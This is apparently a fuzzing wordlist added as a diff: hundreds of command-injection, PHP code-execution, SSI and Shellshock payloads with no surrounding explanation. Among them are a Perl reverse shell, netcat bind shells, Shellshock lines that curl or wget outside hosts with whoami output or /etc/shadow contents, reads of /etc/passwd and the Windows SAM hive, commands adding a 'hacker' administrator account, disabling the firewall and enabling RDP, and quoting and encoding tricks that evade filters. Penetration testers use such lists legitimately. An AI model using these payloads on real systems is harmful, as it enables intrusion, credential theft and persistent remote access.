+&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+() { :;}; echo vulnerable 10
+echo whoami|$0
+echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
+echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="{cmd}"-->
+<!--#exec cmd="id"-->
+<!--#exec cmd="/usr/bin/id"-->
+<!--#exec cmd="/usr/bin/id;-->
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+exec("id")
+EXEC("id")
+exec('ls')
+exec("ping -c 4 192.168.1.6")
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+FAIL||{cmd}
+FAIL||CMD=$"{cmd}";$CMD
+FAIL||CMD=$'{cmd}';$CMD
+FAIL||CMD=$\'{cmd}\';$CMD
+file get contents ("/etc/passwd")
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{ get_user_file("/etc/passwd") }}
+!id
+!id!
+";id;"
+"|id|"
+%id
+%id%
+& id
+&&id
+&id
+';id;'
+'|id|'
+'id'
+; id
+;id
+;id;
+;id|
+`id`
+| id
+||id
+||id||
+|id
+|id;
+|id|
+;id\n
+||id>/var/www/html/id.txt||
+& ifconfig
+&& ifconfig
+; ifconfig
+| ifconfig
+ifconfig
+/index.html|id|
+ipconfig
+& ipconfig /all
+&& ipconfig /all
+; ipconfig /all
+| ipconfig /all
+ipconfig /all
+last
+ls
+& ls -l /
+&& ls -l /
+; ls -l /
+| ls -l /
+ls -l /
+ls -la /home
+& ls -laR /etc
+&& ls -laR /etc
+; ls -laR /etc
+| ls -laR /etc
+& ls -laR /var/www
+&& ls -laR /var/www
+; ls -laR /var/www
+| ls -laR /var/www
+ls -la /tmp
+& ls -l /etc/
+&& ls -l /etc/
+; ls -l /etc/
+| ls -l /etc/
+ls -l /etc/
+ls -lh /etc/
+& ls -l /home/*
+&& ls -l /home/*
+; ls -l /home/*
+| ls -l /home/*
+ls -l /home/*
+*; ls -lhtR /var/www/
+& ls -l /tmp
+&& ls -l /tmp
+; ls -l /tmp
+| ls -l /tmp
+ls -l /tmp
+& ls -l /var/www/*
+&& ls -l /var/www/*
+; ls -l /var/www/*
+| ls -l /var/www/*
+ls -l /var/www/*
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+\n
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+"\n/bin/ls -al\n"
+'\n/bin/ls -al\n'
+\n/bin/ls -al\n
+& nc -lvvp 4444 -e /bin/sh&
+&& nc -lvvp 4444 -e /bin/sh &
+; nc -lvvp 4444 -e /bin/sh;
+| nc -lvvp 4444 -e /bin/sh|
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+\n{cmd}
+\n{cmd}\n
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+& net localgroup Administrators hacker /ADD
+&& net localgroup Administrators hacker /ADD
+; net localgroup Administrators hacker /ADD
+| net localgroup Administrators hacker /ADD
+net localgroup Administrators hacker /ADD
+& netsh firewall set opmode disable
+&& netsh firewall set opmode disable
+; netsh firewall set opmode disable
+| netsh firewall set opmode disable
+netsh firewall set opmode disable
+netstat
+;netstat -a;
+& netstat -an
+&& netstat -an
+; netstat -an
+| netstat -an
+netstat -an
+& net user hacker Password1 /ADD
+&& net user hacker Password1 /ADD
+; net user hacker Password1 /ADD
+| net user hacker Password1 /ADD
+net user hacker Password1 /ADD
+& net view
+&& net view
+; net view
+| net view
+net view
+\nid;
+\nid|
+\nid\n
+|nid\n
+||nslookup+`whoami`.localhost.com||
+||nslookup+www.nsa.gov||
+\n/usr/bin/id;
+\n/usr/bin/id|
+\n/usr/bin/id\n
+passthru("id")
+passthru('id')
+PASSTHRU("id")
+PASSTHRU('id')
+pcntl_exec("/usr/bin/uptime")
+perl -e 'print "X"x1024'
+& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x16096'
+; perl -e 'print "X"x16096'
+| perl -e 'print "X"x16096'
+|| perl -e 'print "X"x16096'
+perl -e 'print "X"x16384'
+& perl -e 'print "X"x2048'
+&& perl -e 'print "X"x2048'
+; perl -e 'print "X"x2048'
+perl -e 'print "X"x2048'
+& perl -e 'print "X"x4096'
+&& perl -e 'print "X"x4096'
+; perl -e 'print "X"x4096'
+| perl -e 'print "X"x4096'
+|| perl -e 'print "X"x4096'
+perl -e 'print "X"x4096'
+&& perl -e 'print "X"x8096'
+; perl -e 'print "X"x8096'
+| perl -e 'print "X"x8096'
+|| perl -e 'print "X"x8096'
+perl -e 'print "X"x8192'
+perl -e 'print "X"x81920'
+{{person.name}}
+{{person.secret}}
+<?php
+& phpinfo()
+&& phpinfo()
+';phpinfo();//
+;phpinfo()
+;phpinfo();//
+| phpinfo()
+|| phpinfo()
+phpinfo()
+phpinfo();
+PHPINFO()
+phpinfo();id
+PHPINFO();id
+phpinfo();system('cat /etc/passwd')
+phpinfo();system('id')
+PHPINFO();SYSTEM('id')
+<?php system("cat /etc/passwd");?>
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
+<?php system("sleep 10");?>
+<?php system("sleep 5");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
+:phpversion();
+`ping 127.0.0.1`
+ping 127.0.0.1
+&&ping+-c+10+127.0.0.1&&
+||ping+-c+10+127.0.0.1||
+"& ping -i 30 127.0.0.1 &"
+& ping -i 30 127.0.0.1 &
+'& ping -i 30 127.0.0.1 &'
+ping -i 30 127.0.0.1 
+ping -n 30
+& ping -n 30 127.0.0.1 &
+print_r($_POST);system('id')
+PRINT_R($_POST);SYSTEM('id')
+print_r(glob("*.config"));
+print_r(glob("*.html"));
+print_r(glob("*.txt"));
+& pwd
+&& pwd
+; pwd
+| pwd
+pwd
+\r
+readfile("/etc/passwd");
+readfile(/etc/passwd
+readfile?"/etc/passwd")
+READFILE("/etc/passwd")
+readfile("index.html");
+READFILE("index.html")
+& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+\r\n
+route
+shell exec("id")
+shell_exec("id")
+SHELL EXEC("id")
+& sleep 1
+&& sleep 1
+; sleep 1
+| sleep 1
+sleep 1
+& sleep 10 
+&& sleep 10
+; sleep 10
+| sleep 10
+|| sleep 10
+sleep 10
+& sleep 15 
+&& sleep 15
+; sleep 15
+| sleep 15
+|| sleep 15
+& sleep 5
+&& sleep 5
+; sleep 5
+| sleep 5
+sleep 5
+somedir \x1a whoami
+& sysinfo
+&& sysinfo
+; sysinfo
+| sysinfo
+sysinfo
+system(%27id%27)
+;system('cat%20/etc/passwd')
+system('cat C:\boot.ini');
+system('cat config.php');
+;system('cat /etc/passwd')
+system('cat /etc/passwd');
+;system('{cmd}')
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+system('curl https://crowdshield.com/.testing/rce_vuln.txt')
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+;system("id")
+;system('id')
+system("id")
+system('id')
+;SYSTEM('id')
+SYSTEM("id")
+system('id');phpinfo()
+SYSTEM('id');PHPINFO()
+& systeminfo
+&& systeminfo
+; systeminfo
+| systeminfo
+systeminfo
+system('ls')
+    system("ping -c 4 " . $ip);
+system('pwd')
+system('pwd');
+& system('sleep 5');
+&& system('sleep 5');
+; system('sleep 5');
+| system('sleep 5');
+|| system('sleep 5');
+system('sleep 5')
+system('sleep 5');
+;system('/usr/bin/id')
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+system('whoami')
+system('whoami');
+test=/ehhh/hmtc/pahhh/hmsswd
+test*; ls -lhtR /var/www/
+test* & perl -e 'print "X"x16096'
+test* && perl -e 'print "X"x16096'
+test* | perl -e 'print "X"x16096'
+test* || perl -e 'print "X"x16096'
+test*; perl -e 'print "X"x16096'
+/???/??t /???/p??s??
+&&type C:\\boot.ini
+& type C:\Windows\repair\SAM
+&& type C:\Windows\repair\SAM
+; type C:\Windows\repair\SAM
+| type C:\Windows\repair\SAM
+type C:\Windows\repair\SAM
+& type C:\Windows\repair\SYSTEM
+&& type C:\Windows\repair\SYSTEM
+; type C:\Windows\repair\SYSTEM
+| type C:\Windows\repair\SYSTEM
+type C:\Windows\repair\SYSTEM
+& type C:\WINNT\repair\SAM
+&& type C:\WINNT\repair\SAM
+; type C:\WINNT\repair\SAM
+| type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SYSTEM
+& type %SYSTEMROOT%\repair\SAM
+&& type %SYSTEMROOT%\repair\SAM
+; type %SYSTEMROOT%\repair\SAM
+| type %SYSTEMROOT%\repair\SAM
+type %SYSTEMROOT%\repair\SAM
+& type %SYSTEMROOT%\repair\SYSTEM
+&& type %SYSTEMROOT%\repair\SYSTEM
+; type %SYSTEMROOT%\repair\SYSTEM
+| type %SYSTEMROOT%\repair\SYSTEM
+type %SYSTEMROOT%\repair\SYSTEM
+;uname;
+uname
+& uname -a
+&& uname -a
+; uname -a
+| uname -a
+uname -a
+uname -n -s
+"|/usr/bin/id|"
+"||/usr/bin/id|"
+'|/usr/bin/id|'
+'||/usr/bin/id|'
+;/usr/bin/id|
+;|/usr/bin/id|
+`/usr/bin/id`
+|/usr/bin/id
+|/usr/bin/id|
+||/usr/bin/id;
+||/usr/bin/id|
+;/usr/bin/id\n
+|usr/bin/id\n
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
+ver
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
+& wget http://crowdshield.com/.testing/rce.txt
+| wget http://crowdshield.com/.testing/rce.txt
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+wget https://crowdshield.com/.testing/rce_vuln.txt
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+who$@ami
+who$()ami
+who$(echo am)i
+!%whoami
+!%whoami%!
+!whoami!
+" & whoami
+" && whoami
+" | whoami
+" || whoami
+" whoami
+"; whoami
+"wh"oami
+%!whoami
+%!whoami!%
+%whoami%
+& whoami
+&& whoami
+' & whoami
+' && whoami
+' || whoami
+' whoami
+'; whoami
+'w'hoami
+; whoami
+\! whoami
+| whoami
+w"h"o"am"i
+w'h'o'am'i
+w\ho\am\i
+wh""oami
+wh''oami
+wh``oami
+whoami
+who`echo am`i
+word " c:\\where\\ || dir || '
+x&&ping+-c+10+127.0.0.1||
+x||ping+-c+10+127.0.0.1||
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+!id!
+%id%
+||id||
+!id
+%id
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+-c 10 127.0.0.1
+-c 10 google.com
+x||ping+-c+10+127.0.0.1||
+||ping+-c+10+127.0.0.1||
+||id>/var/www/html/id.txt||
+||nslookup+www.nsa.gov||
+x&&ping+-c+10+127.0.0.1||
+&&ping+-c+10+127.0.0.1&&
+|id
+&id
+;id
+||id
+&&id
+%0aid%0a
+`id`
+||nslookup+`whoami`.localhost.com||
+$;/usr/bin/id
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+cat $(xxd -r -p <<< 2f6574632f706173737764)
+cat $(xxd -r -ps <(echo 2f6574632f706173737764))
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\a\t /etc/passwd
+ca$@t /etc/passwd
+/???/c?t /etc/passwd
+/???/c?t /?tc/?as?wd
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
